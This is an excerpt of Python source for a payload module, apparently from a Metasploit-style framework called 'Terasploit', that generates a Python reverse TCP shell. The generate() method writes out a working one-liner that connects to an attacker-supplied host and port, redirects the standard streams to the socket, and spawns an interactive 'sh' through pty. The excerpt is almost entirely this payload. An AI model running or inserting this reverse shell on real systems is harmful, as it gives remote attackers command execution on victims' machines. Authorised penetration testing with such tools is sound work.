#######
# Module/Payload: PYTHON Reverse TCP
#######
...
class TerasploitModule(Payload):
    ...
    def initialize(self,info_only: bool = False) -> None:
        update_info(
            {    
                ...
                'Description' : [
                    'Generates PYTHON reverse TCP shell'
                ],
    ...
    def generate(self):
        ...
        raw_shell: str = (
            f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
        )
